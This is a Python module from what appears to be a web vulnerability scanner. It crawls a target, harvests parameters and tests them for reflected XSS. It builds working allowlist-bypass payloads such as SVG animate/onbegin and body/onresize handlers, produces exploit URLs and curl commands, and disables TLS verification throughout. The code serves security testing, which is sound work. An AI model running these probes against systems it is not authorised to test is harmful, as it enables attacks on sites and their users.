#!/usr/bin/env python3
"""
XSS Breakout Integration Module

Integrates the XSS breakout detector with the main scanner.
Handles parameter discovery, URL parsing, and testing workflow.
"""

import urllib.parse
import httpx
from typing import List, Dict, Optional, Tuple
from .xss_breakout_detector import detect_breakout_xss
from .param_discovery import discover_parameters
from .xss_scanner import extract_forms

TAG_EVENT_ALLOWLIST_TECHNIQUE_ID = "xss_tag_event_allowlist_bypass"
TAG_EVENT_ALLOWLIST_TECHNIQUE_NAME = "Bypass tag/event allowlist by probing accepted HTML tag and event handler"
SVG_ANIMATION_ALLOWLIST_TECHNIQUE_ID = "xss_svg_animation_onbegin_allowlist_bypass"
SVG_ANIMATION_ALLOWLIST_TECHNIQUE_NAME = "Bypass tag allowlist using SVG animation element with onbegin event"


def _is_valid_param_name(name: str) -> bool:
    import re
    if not name:
        return False
    if len(name) > 50:
        return False
    return re.match(r'^[A-Za-z0-9_\-\[\]]+$', name) is not None


def _filter_param_names(names: List[str]) -> List[str]:
    return sorted({n for n in names if _is_valid_param_name(n)})


def _harvest_params_from_js(js_text: str, base_url: str) -> List[str]:
    """
    Extract parameter names from JavaScript content.
    """
    import re

    param_names = set()

    # URL-like strings with query params
    js_url_pattern = r'["\']([^"\']+\?[^"\']+)["\']'
    for match in re.findall(js_url_pattern, js_text):
        try:
            full_url = urllib.parse.urljoin(base_url, match)
            parsed = urllib.parse.urlparse(full_url)
            qs = urllib.parse.parse_qs(parsed.query)
            param_names.update(qs.keys())
        except Exception:
            continue

    # Fetch/XHR-style calls: fetch('/path?x=1') or axios.get("..."), $.get("...")
    call_patterns = [
        r'\bfetch\s*\(\s*["\']([^"\']+)["\']',
        r'\baxios\.(?:get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']',
        r'\$\.(?:get|post|ajax)\s*\(\s*["\']([^"\']+)["\']',
        r'\bXMLHttpRequest\(\)\.open\(\s*["\'](?:GET|POST)["\']\s*,\s*["\']([^"\']+)["\']',
    ]
    for pattern in call_patterns:
        for match in re.findall(pattern, js_text, re.IGNORECASE):
            try:
                full_url = urllib.parse.urljoin(base_url, match)
                parsed = urllib.parse.urlparse(full_url)
                qs = urllib.parse.parse_qs(parsed.query)
                param_names.update(qs.keys())
            except Exception:
                continue

    # URLSearchParams("a=b&c=d")
    for match in re.findall(r'URLSearchParams\(\s*["\']([^"\']+)["\']\s*\)', js_text):
        try:
            qs = urllib.parse.parse_qs(match)
            param_names.update(qs.keys())
        except Exception:
            continue

    # URLSearchParams({a:..., b:...})
    for match in re.findall(r'URLSearchParams\(\s*\{([^}]+)\}\s*\)', js_text):
        keys = re.findall(r'([A-Za-z0-9_]+)\s*:', match)
        param_names.update(keys)

    return _filter_param_names(list(param_names))


def _harvest_params_from_html(base_url: str, html: str) -> List[str]:
    """
    Extract parameter names from links/forms/scripts in HTML and inline JS.
    This is lightweight harvesting (no crawling).
    """
    import re

    param_names = set()

    # Extract URLs from common attributes
    attr_pattern = r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']'
    for match in re.findall(attr_pattern, html, re.IGNORECASE):
        try:
            full_url = urllib.parse.urljoin(base_url, match)
            parsed = urllib.parse.urlparse(full_url)
            qs = urllib.parse.parse_qs(parsed.query)
            param_names.update(qs.keys())
        except Exception:
            continue

    # Extract URL-like patterns in inline JS (very loose)
    # Inline JS in HTML
    param_names.update(_harvest_params_from_js(html, base_url))

    return _filter_param_names(list(param_names))


def _harvest_params_from_js_sources(base_url: str, html: str, timeout: int, headers: Optional[Dict[str, str]] = None) -> List[str]:
    """
    Fetch in-scope JS files and harvest params from them.
    """
    import re

    script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if not script_srcs:
        return []

    params = set()
    with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
        for src in script_srcs:
            try:
                full_url = urllib.parse.urljoin(base_url, src)
                parsed = urllib.parse.urlparse(full_url)
                if parsed.scheme not in ('http', 'https'):
                    continue
                if parsed.netloc and parsed.netloc != urllib.parse.urlparse(base_url).netloc:
                    continue
                resp = client.get(full_url)
                if resp.status_code >= 400:
                    continue
                params.update(_harvest_params_from_js(resp.text, base_url))
            except Exception:
                continue

    return _filter_param_names(list(params))


def _crawl_in_scope_urls(start_url: str, max_pages: int, max_depth: int, timeout: int, headers: Optional[Dict[str, str]] = None) -> List[Tuple[str, str]]:
    """
    Lightweight in-scope crawler that returns (url, html) tuples.
    """
    import re
    from collections import deque

    results = []
    visited = set()

    parsed_start = urllib.parse.urlparse(start_url)
    start_netloc = parsed_start.netloc

    queue = deque()
    queue.append((start_url, 0))

    with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
        while queue and len(results) < max_pages:
            url, depth = queue.popleft()
            if url in visited or depth > max_depth:
                continue
            visited.add(url)

            try:
                resp = client.get(url)
                if resp.status_code >= 400:
                    continue
                html = resp.text or ""
                results.append((url, html))

                if depth == max_depth:
                    continue

                # Extract candidate URLs
                links = re.findall(r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)
                for link in links:
                    full_url = urllib.parse.urljoin(url, link)
                    parsed = urllib.parse.urlparse(full_url)
                    if parsed.scheme not in ('http', 'https'):
                        continue
                    if parsed.netloc != start_netloc:
                        continue
                    normalized = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', parsed.query, ''))
                    if normalized not in visited:
                        queue.append((normalized, depth + 1))
            except Exception:
                continue

    return results


def log(msg: str, level: str = 'INFO'):
    """Simple logging function"""
    print(f"[{level}] {msg}")


def _should_try_tag_event_allowlist(param_name: str) -> bool:
    if not param_name:
        return False
    p = param_name.lower()
    return any(tok in p for tok in ('search', 'q', 'query', 'keyword', 'term'))


def _probe_tag_event_allowlist_breakout(client: httpx.Client, url: str, param_name: str) -> Optional[Dict]:
    """
    Detect allowlist-style reflected XSS where most tags/events are blocked but one
    tag/event pair is accepted (for example body+onresize).
    """
    if not _should_try_tag_event_allowlist(param_name):
        return None

    svg_nested_tags = {"animatetransform", "animate", "set", "image", "title"}

    def _tag_probe_payload(tag: str) -> str:
        if tag in svg_nested_tags:
            return f"<svg><{tag}>"
        return f"<{tag}>"

    def _event_probe_payload(tag: str, event: str) -> str:
        if tag in svg_nested_tags:
            return f"<svg><{tag} {event}=1>"
        return f"<{tag} {event}=1>"

    def _exploit_payload(tag: str, event: str) -> str:
        if tag in svg_nested_tags:
            return f'\"><svg><{tag} {event}=print()>'
        return f'\"><{tag} {event}=print()>'

    def _display_markup(tag: str, event: str) -> str:
        if tag in svg_nested_tags:
            return f"<svg><{tag} {event}=print()>"
        return f"<{tag} {event}=print()>"

    try:
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        def _req(payload: str):
            resp = client.get(base_url, params={param_name: payload})
            return resp

        baseline_payload = "<img src=1 onerror=print()>"
        baseline_resp = _req(baseline_payload)
        if baseline_resp.status_code < 400:
            return None

        tag_candidates = ["body", "math", "animatetransform", "animate", "svg", "image", "title", "details", "marquee", "iframe", "a"]
        allowed_tags: List[str] = []
        for tag in tag_candidates:
            r = _req(_tag_probe_payload(tag))
            if r.status_code < 400:
                allowed_tags.append(tag)
        if not allowed_tags:
            return None

        event_candidates = ["onbegin", "onresize", "onload", "onanimationstart", "onfocus", "onclick", "onmouseover", "onerror"]
        allowed_tag = None
        allowed_event = None
        for tag in allowed_tags:
            for ev in event_candidates:
                if tag == "svg" and ev == "onbegin":
                    # Prefer executable SVG animation elements for onbegin probes.
                    continue
                r = _req(_event_probe_payload(tag, ev))
                if r.status_code < 400:
                    allowed_tag = tag
                    allowed_event = ev
                    break
            if allowed_event:
                break
        if not allowed_tag or not allowed_event:
            return None

        successful_payload = _exploit_payload(allowed_tag, allowed_event)
        final_resp = _req(successful_payload)
        if final_resp.status_code >= 400:
            return None
        body = final_resp.text or ""
        marker = f"{allowed_event}=print()"
        if marker not in body:
            return None

        exploit_url = str(final_resp.url)
        around = ""
        idx = body.find(marker)
        if idx != -1:
            around = body[max(0, idx - 80):idx + 120]

        reflected_markup = _display_markup(allowed_tag, allowed_event)
        browser_steps = [
            f"Open: {exploit_url}",
            f"Observe reflected injection using {reflected_markup}",
        ]
        if allowed_tag == "body" and allowed_event == "onresize":
            browser_steps.append("Use an iframe width change to auto-trigger onresize without user interaction")
        if allowed_tag in svg_nested_tags and allowed_event == "onbegin":
            browser_steps.append("SVG animation events auto-fire; observe print() without user interaction")

        description_markup = f"<svg><{allowed_tag}>" if allowed_tag in svg_nested_tags else f"<{allowed_tag}>"

        is_svg_animation = allowed_tag in svg_nested_tags and allowed_event == "onbegin"
        technique_id = SVG_ANIMATION_ALLOWLIST_TECHNIQUE_ID if is_svg_animation else TAG_EVENT_ALLOWLIST_TECHNIQUE_ID
        technique_name = SVG_ANIMATION_ALLOWLIST_TECHNIQUE_NAME if is_svg_animation else TAG_EVENT_ALLOWLIST_TECHNIQUE_NAME

        return {
            "vulnerability_type": "breakout_xss",
            "context_type": "html_tag_event_allowlist",
            "context_description": "Tag/event allowlist bypass in reflected HTML context",
            "parameter": param_name,
            "method": "GET",
            "url": exploit_url,
            "surrounding_code": "",
            "context_snippet": around,
            "required_escape": "Quote breakout and allowed event handler injection",
            "successful_payload": successful_payload,
            "payload_description": f"Allowlisted {description_markup} + {allowed_event} event handler",
            "simple_payloads_blocked": True,
            "encoding_layers": [],
            "severity": "high",
            "cvss_score": 7.5,
            "technique_id": technique_id,
            "technique_name": technique_name,
            "remediation": "Use strict output encoding and a positive allowlist for safe tags/attributes; avoid reflecting raw HTML from user input.",
            "exploitation": {
                "curl_command": f"curl -X GET '{exploit_url}'",
                "explanation": "Application blocks common vectors but allows an exploitable tag/event pair that still executes script.",
                "browser_steps": browser_steps,
            },
            "evidence": {
                "blocked_baseline_payload": baseline_payload,
                "allowed_tag": allowed_tag,
                "allowed_event": allowed_event,
                "allowed_tags": allowed_tags,
            },
        }
    except Exception:
        return None


def extract_url_parameters(url: str) -> List[Tuple[str, str]]:
    """
    Extract parameter names from URL query string
    
    Args:
        url: Full URL with query parameters
    
    Returns:
        List of (param_name, method) tuples
    """
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return []
    
    params = urllib.parse.parse_qs(parsed.query)
    return [(param_name, 'GET') for param_name in params.keys()]


def discover_form_parameters(url: str, timeout: int = 10, headers: Optional[Dict[str, str]] = None) -> List[Tuple[str, str, Dict]]:
    """
    Discover POST parameters by fetching the page and parsing forms
    
    Args:
        url: Target URL to fetch
        timeout: Request timeout
    
    Returns:
        List of (param_name, method, form_data) tuples
    """
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
            response = client.get(url)

            forms = extract_forms(response.text)
            if not forms:
                return []

            results = []
            for form in forms:
                form_method = (form.get('method') or 'GET').upper()
                inputs = form.get('inputs', [])
                if not inputs:
                    continue

                form_data = {}
                for inp in inputs:
                    name = inp.get('name')
                    if not name:
                        continue
                    form_data[name] = inp.get('value') or 'test'
                    results.append((name, form_method, form_data))

            if results:
                unique_fields = sorted({name for name, _, _ in results})
                log(f"Discovered {len(unique_fields)} form field(s): {', '.join(unique_fields)}", 'INFO')
            return results
    
    except Exception as e:
        log(f"Error discovering form parameters: {str(e)}", 'WARN')
        return []


def scan_url_for_breakout_xss(url: str,
                               use_arjun: bool = True,
                               timeout: int = 10,
                               headers: Optional[Dict[str, str]] = None,
                               callback_url: Optional[str] = None,
                               safe_mode: bool = True,
                               arjun_threads: int = 10,
                               arjun_timeout: int = 120,
                               arjun_wordlist: Optional[str] = None,
                               fallback_params: Optional[List[str]] = None,
                               crawl_enabled: bool = True,
                               crawl_max_pages: int = 25,
                               crawl_max_depth: int = 2) -> List[Dict]:
    """
    Comprehensive breakout XSS scanning for a single URL
    
    This function:
    1. Extracts parameters from the URL
    2. Discovers hidden parameters with Arjun (optional)
    3. Discovers POST parameters from forms
    4. Tests each parameter for breakout XSS
    
    Args:
        url: Target URL to scan
        use_arjun: Whether to use Arjun for hidden parameter discovery
        timeout: Request timeout for testing
        callback_url: Optional callback URL for blind XSS
    
    Returns:
        List of vulnerability dictionaries
    """
    vulnerabilities = []
    tested_params = set()
    
    log(f"Starting comprehensive breakout XSS scan on {url}", 'INFO')
    
    # Step 1: Extract parameters from URL
    url_params = extract_url_parameters(url)
    log(f"Found {len(url_params)} parameter(s) in URL", 'INFO')

    # Step 1b: Harvest params from HTML/JS and optional crawl
    try:
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        harvested = set()
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
            response = client.get(url)
        harvested.update(_harvest_params_from_html(base_url, response.text))
        harvested.update(_harvest_params_from_js_sources(base_url, response.text, timeout, headers=headers))

        if crawl_enabled:
            crawled = _crawl_in_scope_urls(base_url, crawl_max_pages, crawl_max_depth, timeout, headers=headers)
            for crawled_url, html in crawled:
                # params from URL itself
                parsed_c = urllib.parse.urlparse(crawled_url)
                harvested.update(urllib.parse.parse_qs(parsed_c.query).keys())
                # params from HTML/JS
                harvested.update(_harvest_params_from_html(crawled_url, html))
                harvested.update(_harvest_params_from_js_sources(crawled_url, html, timeout, headers=headers))
            log(f"Crawled {len(crawled)} page(s) for parameter harvesting", 'INFO')

        if harvested:
            for param in _filter_param_names(list(harvested)):
                if (param, 'GET') not in url_params:
                    url_params.append((param, 'GET'))
            log(f"Harvested {len(harvested)} parameter(s) from HTML/JS", 'INFO')
    except Exception as e:
        log(f"Parameter harvesting failed: {str(e)}", 'WARN')
    
    # Step 2: Discover hidden parameters with Arjun (if enabled)
    if use_arjun:
        try:
            parsed = urllib.parse.urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            arjun_result = discover_parameters(
                base_url,
                method='GET',
                threads=arjun_threads,
                timeout=arjun_timeout,
                wordlist=arjun_wordlist
            )
            if arjun_result.get('parameters'):
                for param in _filter_param_names(arjun_result['parameters']):
                    if (param, 'GET') not in url_params:
                        url_params.append((param, 'GET'))
                log(f"Arjun discovered {len(arjun_result['parameters'])} additional parameter(s)", 'INFO')
        except Exception as e:
            log(f"Arjun parameter discovery failed: {str(e)}", 'WARN')
    
    # Step 3: Discover POST parameters from forms
    form_params = discover_form_parameters(url, timeout=timeout, headers=headers)
    log(f"Found {len(form_params)} form parameter(s)", 'INFO')

    # Promote GET form params into URL param list
    for param_name, method, _ in form_params:
        if method == 'GET' and (param_name, 'GET') not in url_params:
            url_params.append((param_name, 'GET'))

    # If still no GET params, try a small common set
    if not url_params:
        common_params = fallback_params or ['q', 'search', 'query', 'keyword', 'term', 'id', 'page', 'url', 'redirect', 'name']
        url_params.extend([(p, 'GET') for p in common_params])
        log(f"No parameters discovered, falling back to common set: {', '.join(common_params)}", 'INFO')
    # Step 4: Test each GET parameter
    with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as probe_client:
        for param_name, method in url_params:
            param_key = f"{param_name}:{method}"
            if param_key in tested_params:
                continue

            tested_params.add(param_key)
            log(f"Testing GET parameter: {param_name}", 'INFO')

            allowlist_vuln = _probe_tag_event_allowlist_breakout(probe_client, url, param_name)
            if allowlist_vuln:
                log(f"BREAKOUT XSS found in parameter '{param_name}' (GET, allowlist bypass)", 'VULN')
                vulnerabilities.append(allowlist_vuln)
                continue

            vuln = detect_breakout_xss(
                url=url,
                param_name=param_name,
                method='GET',
                timeout=timeout,
                headers=headers,
                callback_url=callback_url,
                safe_mode=safe_mode
            )

            if vuln:
                log(f"BREAKOUT XSS found in parameter '{param_name}' (GET)", 'VULN')
                vulnerabilities.append(vuln)
            else:
                log(f"  No breakout XSS in parameter '{param_name}'", 'DEBUG')

    # Step 5: Test each POST parameter
    for param_name, method, form_data in form_params:
        if method != 'POST':
            continue
        param_key = f"{param_name}:{method}"
        if param_key in tested_params:
            continue
        
        tested_params.add(param_key)
        log(f"Testing POST parameter: {param_name}", 'INFO')
        
        vuln = detect_breakout_xss(
            url=url,
            param_name=param_name,
            method='POST',
            form_data=form_data,
            timeout=timeout,
            headers=headers,
            callback_url=callback_url,
            safe_mode=safe_mode
        )
        
        if vuln:
            log(f"BREAKOUT XSS found in parameter '{param_name}' (POST)", 'VULN')
            vulnerabilities.append(vuln)
        else:
            log(f"  No breakout XSS in parameter '{param_name}'", 'DEBUG')
    
    # Summary
    if vulnerabilities:
        log(f"\nFound {len(vulnerabilities)} breakout XSS vulnerabilit{'y' if len(vulnerabilities) == 1 else 'ies'}", 'VULN')
    else:
        log("\nNo breakout XSS vulnerabilities detected", 'INFO')
    
    return vulnerabilities


def format_breakout_vuln_for_report(vuln: Dict) -> Dict:
    """
    Format breakout XSS vulnerability for main scanner report
    
    Converts the breakout detector output to the format expected by the main scanner
    
    Args:
        vuln: Vulnerability dictionary from detect_breakout_xss()
    
    Returns:
        Formatted vulnerability dictionary
    """
    return {
        'type': 'breakout_xss',
        'description': f"Breakout XSS in {vuln.get('context_description', 'unknown context')}",
        'severity': vuln.get('severity', 'high'),
        'cvss_score': vuln.get('cvss_score', 7.5),
        'url': vuln.get('url'),
        'parameter': vuln.get('parameter'),
        'method': vuln.get('method'),
        'payload': vuln.get('successful_payload'),
        'context_type': vuln.get('context_type'),
        'context_description': vuln.get('context_description'),
        'surrounding_code': vuln.get('surrounding_code'),
        'context_snippet': vuln.get('context_snippet'),
        'required_escape': vuln.get('required_escape'),
        'encoding_layers': vuln.get('encoding_layers', []),
        'technique_id': vuln.get('technique_id'),
        'technique_name': vuln.get('technique_name'),
        'remediation': vuln.get('remediation'),
        'exploitation': vuln.get('exploitation'),
        'simple_payloads_blocked': vuln.get('simple_payloads_blocked', True),
    }

